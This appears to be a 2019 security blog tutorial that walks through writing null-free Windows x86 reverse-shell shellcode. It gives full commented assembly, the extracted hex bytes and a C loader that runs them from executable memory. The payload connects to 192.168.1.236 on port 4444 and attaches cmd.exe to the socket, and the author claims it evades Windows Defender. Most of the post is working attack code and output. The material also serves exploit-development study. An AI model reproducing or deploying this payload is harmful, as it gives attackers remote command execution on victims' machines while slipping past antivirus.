---
layout: single
title: Win32 Shellcode - Spawn Reverse Shell
date: 2019-11-16
classes: wide
header:
  teaser: /assets/images/shell.png
tags:
  - Assembly
  - Pentester
  - Windows
  - Shellcode
  - x86
  - Reverse shell
--- 
![](/assets/images/shell.png)<br>

## Introduction
[In the last post](https://blackcloud.me/Win32-shellcode-3/) we spawned a custom MessagBox on Windows x86. Now we'll move on to all of us want to do, a reverse shell. This type of command need a process like MessageBox but we need to load a different dll, the ```ws2_32.dll``` library so we need to reuse the ```LoadLibraryA``` for search the functions needed, with the right data structures as parameters.<br>
As sais the concepts are more or less the same of the past shellcode.<br>

## The Workflow
As you can see in the code above the first part is the same of the MessageBox shellcode, but instead of ```User32.dll```, we need the ```ws2_32.dll``` handler.
The process can be resumed in this steps:
1. Get ```kernel32.dll``` and store its address somewhere for future purposes
2. Find the ```GetProcAddress``` function address and store it somewhere for future purposes 
3. Find the ```LoadLibraryA``` address 
4. Use ```LoadLibraryA``` to find ```ws2_32.dll``` address and store it somewhere for future purposes
5. Use ```GetProcAddress``` and ```ws2_32.dll``` to find and call the ```WSAStartup``` function, [MSDN documentation here](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup)
6. Use ```GetProcAddress``` and ```ws2_32.dll``` to find and call the ```WSASocketA``` function, [MSDN documentation here](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa)
7. Use ```GetProcAddress``` and ```ws2_32.dll``` to find and call the ```Connect``` function, [MSDN documentation here](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect)
8. Find the ```CreateProcessA``` function using the ```GetProcAddress``` and the ```kerne32.dll``` handler previously stored
9. Call a ```cmd.exe``` Process on the socket opened with ```Connect``` using the ```CreateProcessA``` address
10. Call the ```ExitProcess``` function using the ```GetProcAddress``` and the ```kerne32.dll``` handler previously stored

As you can see there a lot of stuffs to do, and there are also some considerations to do about data structures needed

### WSAStartup
```C++
WSAStartup(MAKEWORD(2, 2), wsadata_pointer)

int WSAStartup(
  WORD      wVersionRequired,
  LPWSADATA lpWSAData
);
```
>The current version of the Windows Sockets specification is version 2.2. [...]
To get full access to the new syntax of a higher version of the Windows Sockets specification, the application must negotiate for this higher version. In this case, the wVersionRequested parameter should be set to request version 2.2. [...]
Windows Sockets version 2.2 is supported on Windows Server 2008, Windows Vista, Windows Server 2003, Windows XP, Windows 2000, Windows NT 4.0 with Service Pack 4 (SP4) and later, Windows Me, Windows 98, and Windows 95 OSR2. Windows Sockets version 2.2 is also supported on
Windows 95 with the Windows Socket 2 Update. Applications on these platforms should normally request Winsock 2.2 by setting the wVersionRequested parameter accordingly.
On Windows 95 and versions of Windows NT 3.51 and earlier, Windows Sockets version 1.1 is the highest version of the Windows Sockets specification supported.<br>

You can read Marco's blogpost for a deep explanation.<br>
The [WSAData](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata) structure is well defined in manual.<br>
If successful, the WSAStartup function returns zero in EAX. Otherwise, it returns error codes.

### WSASocketA
```C++
SOCKET WSAAPI WSASocketA(
  int                 af,
  int                 type,
  int                 protocol,
  LPWSAPROTOCOL_INFOA lpProtocolInfo,
  GROUP               g,
  DWORD               dwFlags
);
```
RTFM because it is very simple here, similar to the socket syscall in Linux. We are in Little Endian so reverse the order of parameters pushed on stack and analyze it:
- dwFlags=NULL
- g=NULL
- lpProtocolInfo=NULL
- protocol must be IPPROTO_TCP so protocol=6
- Type must be SOCK_STREAM so type=1
- Address Family must be AF_INET so af=2

### Connect
```C++
int WSAAPI connect(
  SOCKET         s,
  const sockaddr *name,
  int            namelen
);
```
Parameters:<br>
```s``` is a descriptor identifying an unconnected socket.<br>
```name``` is a pointer to the sockaddr structure to which the connection should be established.<br>
```namelen``` is the length, in bytes, of the sockaddr structure pointed to by the name parameter.<br>
If no error occurs, connect returns zero. Otherwise, it returns SOCKET_ERROR, and a specific error code can be retrieved by calling.<br>

## The Shellcode
The comments in the code help understand how it works:<br>

```nasm
global _start

section .text
_start:


getkernel32:
	xor ecx, ecx                ; zeroing register ECX
	mul ecx                     ; zeroing register EAX EDX
	mov eax, [fs:ecx + 0x030]   ; PEB loaded in eax
	mov eax, [eax + 0x00c]      ; LDR loaded in eax
	mov esi, [eax + 0x014]      ; InMemoryOrderModuleList loaded in esi
	lodsd                       ; program.exe address loaded in eax (1st module)
	xchg esi, eax				
	lodsd                       ; ntdll.dll address loaded (2nd module)
	mov ebx, [eax + 0x10]       ; kernel32.dll address loaded in ebx (3rd module)

	; EBX = base of kernel32.dll address

getAddressofName:
	mov edx, [ebx + 0x3c]       ; load e_lfanew address in ebx
	add edx, ebx				
	mov edx, [edx + 0x78]       ; load data directory
	add edx, ebx
	mov esi, [edx + 0x20]       ; load "address of name"
	add esi, ebx
	xor ecx, ecx

	; ESI = RVAs

getProcAddress:
	inc ecx                             ; ordinals increment
	lodsd                               ; get "address of name" in eax
	add eax, ebx				
	cmp dword [eax], 0x50746547         ; GetP
	jnz getProcAddress
	cmp dword [eax + 0x4], 0x41636F72   ; rocA
	jnz getProcAddress
	cmp dword [eax + 0x8], 0x65726464   ; ddre
	jnz getProcAddress

getProcAddressFunc:
	mov esi, [edx + 0x24]       ; offset ordinals
	add esi, ebx                ; pointer to the name ordinals table
	mov cx, [esi + ecx * 2]     ; CX = Number of function
	dec ecx
	mov esi, [edx + 0x1c]       ; ESI = Offset address table
	add esi, ebx                ; we placed at the begin of AddressOfFunctions array
	mov edx, [esi + ecx * 4]    ; EDX = Pointer(offset)
	add edx, ebx                ; EDX = getProcAddress
	mov ebp, edx                ; save getProcAddress in EBP for future purpose

getLoadLibraryA:
	xor ecx, ecx                ; zeroing ecx
	push ecx                    ; push 0 on stack
	push 0x41797261             ; 
	push 0x7262694c             ;  AyrarbiLdaoL
	push 0x64616f4c             ;
	push esp
	push ebx                    ; kernel32.dll
	call edx                    ; call GetProcAddress and find LoadLibraryA address

    ; EAX 76392864 kernel32.LoadLibraryA
    ; ECX 76340000 kernel32.76340000
    ; EDX 76340000 kernel32.76340000
    ; EBX 76340000 kernel32.76340000
    ; ESP 0022FF7C ASCII "LoadLibraryA"
    ; EBP 76391837 kernel32.GetProcAddress
    ; ESI 763F4DD0 kernel32.763F4DD0
    ; EDI 00000000
    ; EIP 0040106F reverse_.0040106F

getws2_32:
	push 0x61613233			        ; 23
	sub word [esp + 0x2], 0x6161    ; sub aa from aa23_2sw
	push 0x5f327377 		        ; _2sw
	push esp                        ; pointer to the string
	call eax 						; call Loadlibrary and find ws2_32.dll
	mov esi, eax                    ; save winsock handle for future puproses

    ; EAX 76740000 OFFSET ws2_32.#332
    ; ECX 77DC316F ntdll.77DC316F
    ; EDX 005E0174
    ; EBX 76660000 kernel32.76660000
    ; ESP 0022FF74 ASCII "ws2_32"
    ; EBP 766B1837 kernel32.GetProcAddress
    ; ESI 76740000 OFFSET ws2_32.#332
    ; EDI 00000000
    ; EIP 00401085 reverse_.00401085

getWSAStartup:
	push 0x61617075                  ; aapu
	sub word [esp + 0x2], 0x6161     ; sub aa from aapu
	push 0x74726174                  ; trat
	push 0x53415357                  ; SASW
	push esp	                     ; pointer to the string
	push esi	                     ; winsock handler
	call ebp                         ; GetProcAddress(ws2_32.dll, WSAStartup)

    ; EAX 7674C0FB ws2_32.WSAStartup
    ; ECX 76740000 OFFSET ws2_32.#332
    ; EDX 00001725
    ; EBX 76660000 kernel32.76660000
    ; ESP 0022FF68 ASCII "WSAStartup"
    ; EBP 766B1837 kernel32.GetProcAddress
    ; ESI 76740000 OFFSET ws2_32.#332
    ; EDI 00000000
    ; EIP 0040109F reverse_.0040109F

callWSAStartUp:
	xor edx, edx
	mov dx, 0x190          ; EAX = sizeof( struct WSAData )
	sub esp, edx           ; alloc some space for the WSAData structure
	push esp               ; push a pointer to this stuct
	push edx               ; push the wVersionRequested parameter
	call eax               ; call WSAStartup(MAKEWORD(2, 2), wsadata_pointer)

    ; EAX 00000000
    ; ECX 7674C230 ws2_32.7674C230
    ; EDX 77DB0002 ASCII "ingToUnicodeString"
    ; EBX 76660000 kernel32.76660000
    ; ESP 0022FDD8
    ; EBP 766B1837 kernel32.GetProcAddress
    ; ESI 76740000 OFFSET ws2_32.#332
    ; EDI 00000000
    ; EIP 004010AA reverse_.004010AA

getWSASocketA:
	push 0x61614174                  ; 'aaAt'
	sub word [esp + 0x2], 0x6161          ; sub aa from aaAt
	push 0x656b636f                  ; 'ekco'
	push 0x53415357                  ; 'SASW'
	push esp                         ; pointer to the string
	push esi                         ; socket handler
	call ebp                         ; GetProcAddress(ws2_32.dll, WSASocketA)

    ; EAX 7674B7FC ws2_32.WSASocketA
    ; ECX 76740000 OFFSET ws2_32.#332
    ; EDX 00001725
    ; EBX 76660000 kernel32.76660000
    ; ESP 0022FDCC ASCII "WSASocketA"
    ; EBP 766B1837 kernel32.GetProcAddress
    ; ESI 76740000 OFFSET ws2_32.#332
    ; EDI 00000000
    ; EIP 004010C4 reverse_.004010C4

callWSASocketA:
	xor edx, edx		            ; clear edx
	push edx;		                ; dwFlags=NULL
	push edx;		                ; g=NULL
	push edx;		                ; lpProtocolInfo=NULL
	mov dl, 0x6		                ; protocol=6
	push edx
	sub dl, 0x5      	            ; edx==1
	push edx		                ; type=1
	inc edx			                ; af=2
	push edx
	call eax		                ; call WSASocketA
	push eax		                ; save eax in edx
	pop edi			                ; 

    ; EAX 00000054
    ; ECX 73FB685E
    ; EDX 00000016
    ; EBX 76660000 kernel32.76660000
    ; ESP 0022FDCC ASCII "WSASocketA"
    ; EBP 766B1837 kernel32.GetProcAddress
    ; ESI 76740000 OFFSET ws2_32.#332
    ; EDI 00000054
    ; EIP 004010D6 reverse_.004010D6

getConnect:
	push 0x61746365                 ; atce
	sub word [esp + 0x3], 0x61      ; atce - a = tce
	push 0x6e6e6f63                 ; nnoc
	push esp	                    ; pointer to the string
	push esi	                    ; socket handler
	call ebp                        ; GetProcAddress(ws2_32.dll, connect)

    ; EAX 767448BE ws2_32.connect
    ; ECX 76740000 OFFSET ws2_32.#332
    ; EDX 00001725
    ; EBX 76660000 kernel32.76660000
    ; ESP 0022FDC4 ASCII "connect"
    ; EBP 766B1837 kernel32.GetProcAddress
    ; ESI 76740000 OFFSET ws2_32.#332
    ; EDI 00000054
    ; EIP 004010EA reverse_.004010EA

callConnect:
	;set up sockaddr_in
	mov edx, 0xec02a9c1	            ;the IP plus 0x01010101 so we avoid NULLs (IP=192.168.1.236)
	sub edx, 0x01010101	            ;subtract from edx to obtain the real IP
	push edx                        ;push sin_addr
	push word 0x5c11                ;0x115c = (port 4444)
	xor edx, edx
	mov dl, 2
	push dx	
	mov edx, esp
	push byte 0x10
	push edx
	push edi
	call eax

    ; EAX 00000000
    ; ECX 00347010
    ; EDX 77DB64F4 ntdll.KiFastSystemCallRet
    ; EBX 76660000 kernel32.76660000
    ; ESP 0022FDBC
    ; EBP 766B1837 kernel32.GetProcAddress
    ; ESI 76740000 OFFSET ws2_32.#332
    ; EDI 00000054
    ; EIP 00401108 reverse_.00401108

getCreateProcessA:
	xor ecx, ecx 					; zeroing ECX
	push 0x61614173					; aaAs
	sub word [esp + 0x2], 0x6161 	; aaAs - aa
	push 0x7365636f 				; ecor
	push 0x72506574					; rPet
	push 0x61657243 				; aerC
	push esp 						; push the pointer to stack
	push ebx 						; kernel32 handler
	call ebp 						; GetProcAddress(kernel32.dll, CreateProcessA)
	mov esi, ebx                    ; save kernel32.dll handler for future purposes

    ; EAX 76662062 kernel32.CreateProcessA
    ; ECX 76660000 kernel32.76660000
    ; EDX 76660000 kernel32.76660000
    ; EBX 76660000 kernel32.76660000
    ; ESP 0022FDAC ASCII "CreateProcessA"
    ; EBP 766B1837 kernel32.GetProcAddress
    ; ESI 76660000 kernel32.76660000
    ; EDI 00000054
    ; EIP 00401129 reverse_.00401129

shell:
	push 0x61646d63                 ; push admc
	sub word [esp + 0x3], 0x61      ; sub a to admc = dmc
	mov ebx, esp                    ; save a pointer to the command line
	push edi                        ; our socket becomes the shells hStdError
	push edi                        ; our socket becomes the shells hStdOutput
	push edi                        ; our socket becomes the shells hStdInput
	xor edi, edi                    ; Clear edi for all the NULL's we need to push
	push byte 0x12                  ; We want to place (18 * 4) = 72 null bytes onto the stack
	pop ecx                         ; Set ECX for the loop

push_loop:
	push edi                        ; push a null dword
	loop push_loop                  ; keep looping untill we have pushed enough nulls
	mov word [esp + 0x3C], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
	mov byte [esp + 0x10], 0x44
	lea ecx, [esp + 0x10]  ; Set EAX as a pointer to our STARTUPINFO Structure

  	;perform the call to CreateProcessA
	push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
	push ecx               ; Push the pointer to the STARTUPINFO Structure
	push edi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
	push edi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
	push edi               ; We dont specify any dwCreationFlags 
	inc edi                ; Increment edi to be one
	push edi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
	dec edi                ; Decrement edi back down to zero
	push edi               ; Set lpThreadAttributes to NULL
	push edi               ; Set lpProcessAttributes to NULL
	push ebx               ; Set the lpCommandLine to point to "cmd",0
	push edi               ; Set lpApplicationName to NULL as we are using the command line param instead
	call eax

    ; EAX 00000001
    ; ECX 766BF6B0 kernel32.766BF6B0
    ; EDX 002E0174
    ; EBX 0022FDA8 ASCII "cmd"
    ; ESP 0022FD54
    ; EBP 766B1837 kernel32.GetProcAddress
    ; ESI 76660000 kernel32.76660000
    ; EDI 00000054
    ; EIP 0040115F reverse_.0040115F

getExitProcess:
	add esp, 0x010 				; clean the stack
	push 0x61737365				; asse
	sub word [esp + 0x3], 0x61  ; asse -a 
	push 0x636F7250				; corP
	push 0x74697845				; tixE
	push esp
	push esi
	call ebp                    ; GetProcAddress(kernel32.dll, ExitProcess)

	xor ecx, ecx
	push ecx
	call eax
```

Compile it and test it

```bash
root@root:# nasm -f elf32 reverse_shell_shellcode.nasm ; ld -melf_i386 -o reverse_shell_shellcode reverse_shell_shellcode.o

root@root:# objdump -d ./reverse_shell_shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad"
"\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda"
"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65"
"\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78"
"\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c"
"\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31"
"\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f"
"\x61\x64\x54\x53\xff\xd2\x68\x33\x32\x61\x61\x66\x81\x6c\x24"
"\x02\x61\x61\x68\x77\x73\x32\x5f\x54\xff\xd0\x89\xc6\x68\x75"
"\x70\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x74\x61\x72\x74"
"\x68\x57\x53\x41\x53\x54\x56\xff\xd5\x31\xd2\x66\xba\x90\x01"
"\x29\xd4\x54\x52\xff\xd0\x68\x74\x41\x61\x61\x66\x81\x6c\x24"
"\x02\x61\x61\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\x56"
"\xff\xd5\x31\xd2\x52\x52\x52\xb2\x06\x52\x80\xea\x05\x52\x42"
"\x52\xff\xd0\x50\x5f\x68\x65\x63\x74\x61\x66\x83\x6c\x24\x03"
"\x61\x68\x63\x6f\x6e\x6e\x54\x56\xff\xd5\xba\xc1\xa9\x02\xed"
"\x81\xea\x01\x01\x01\x01\x52\x66\x68\x11\x5c\x31\xd2\xb2\x02"
"\x66\x52\x89\xe2\x6a\x10\x52\x57\xff\xd0\x31\xc9\x68\x73\x41"
"\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x6f\x63\x65\x73\x68"
"\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x53\xff\xd5\x89\xde"
"\x68\x63\x6d\x64\x61\x66\x83\x6c\x24\x03\x61\x89\xe3\x57\x57"
"\x57\x31\xff\x6a\x12\x59\x57\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
"\x01\xc6\x44\x24\x10\x44\x8d\x4c\x24\x10\x54\x51\x57\x57\x57"
"\x47\x57\x4f\x57\x57\x53\x57\xff\xd0\x83\xc4\x10\x68\x65\x73"
"\x73\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f\x63\x68\x45"
"\x78\x69\x74\x54\x56\xff\xd5\x31\xc9\x51\xff\xd0"
```
The shellcode.c file

```C++
#include <stdio.h>
#include <windows.h>

int main()
{

    char* shellcode = \
    "\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad"
"\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda"
"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65"
"\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78"
"\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c"
"\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31"
"\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f"
"\x61\x64\x54\x53\xff\xd2\x68\x33\x32\x61\x61\x66\x81\x6c\x24"
"\x02\x61\x61\x68\x77\x73\x32\x5f\x54\xff\xd0\x89\xc6\x68\x75"
"\x70\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x74\x61\x72\x74"
"\x68\x57\x53\x41\x53\x54\x56\xff\xd5\x31\xd2\x66\xba\x90\x01"
"\x29\xd4\x54\x52\xff\xd0\x68\x74\x41\x61\x61\x66\x81\x6c\x24"
"\x02\x61\x61\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\x56"
"\xff\xd5\x31\xd2\x52\x52\x52\xb2\x06\x52\x80\xea\x05\x52\x42"
"\x52\xff\xd0\x50\x5f\x68\x65\x63\x74\x61\x66\x83\x6c\x24\x03"
"\x61\x68\x63\x6f\x6e\x6e\x54\x56\xff\xd5\xba\xc1\xa9\x02\xed"
"\x81\xea\x01\x01\x01\x01\x52\x66\x68\x11\x5c\x31\xd2\xb2\x02"
"\x66\x52\x89\xe2\x6a\x10\x52\x57\xff\xd0\x31\xc9\x68\x73\x41"
"\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x6f\x63\x65\x73\x68"
"\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x53\xff\xd5\x89\xde"
"\x68\x63\x6d\x64\x61\x66\x83\x6c\x24\x03\x61\x89\xe3\x57\x57"
"\x57\x31\xff\x6a\x12\x59\x57\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
"\x01\xc6\x44\x24\x10\x44\x8d\x4c\x24\x10\x54\x51\x57\x57\x57"
"\x47\x57\x4f\x57\x57\x53\x57\xff\xd0\x83\xc4\x10\x68\x65\x73"
"\x73\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f\x63\x68\x45"
"\x78\x69\x74\x54\x56\xff\xd5\x31\xc9\x51\xff\xd0"; 
			
    printf("shellcode length: %i", strlen(shellcode));

    LPVOID lpAlloc = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(lpAlloc, shellcode, strlen(shellcode));

    ((void(*)())lpAlloc)();

    return 0;
}
```
Compile it on Windows 
```dos
c:\MinGW\bin>gcc shellcode.c -o shellcode
```

Windows 7 (x86)
![](/assets/images/windows/x86/reverse_shell_0.gif)<br>

and Windows 10 (x86)

![](/assets/images/windows/x86/reverse_shell_1.gif)<br>

The length is 387 bytes and is NULL free.<br>
It seems also that the shellcode bypass Windows Defender AV updated at 15/11/2019

## References
- [This amazing book](https://nostarch.com/malware) help me a lot understand how Win32 kernel API works
- [The amazing h0mbre blog](https://h0mbre.github.io/Babys-First-Shellcode/) 
- [Introduction to Windows Shellcode Development – Part 3](https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/) by [@NytroRST](https://twitter.com/NytroRST/)
- [Windows Shellcoding x86 – Hunting Kernel32.dll – Part 1](https://0xdarkvortex.dev/index.php/2019/03/18/windows-shellcoding-x86-hunting-kernel32-dll-part-1/) by [@NinjaParanoid](https://twitter.com/NinjaParanoid)
- [Shellcoding for Linux and Windows Tutorial](http://www.vividmachines.com/shellcode/shellcode.html#ws) by [Steve Hanna](https://twitter.com/lestevehanna)
- [A good paper book](http://hick.org/code/skape/papers/win32-shellcode.pdf)
- [Windows x86 MessageBox shellcode](https://marcosvalle.github.io/re/exploit/2019/01/19/messagebox-shellcode.html) by [@MValle](https://twitter.com/_mvalle_) 
- [The PacketStorm Calc Shellcode](https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html)
- [My Github Win x86 shellcode repo](https://github.com/bolonobolo/shellcode)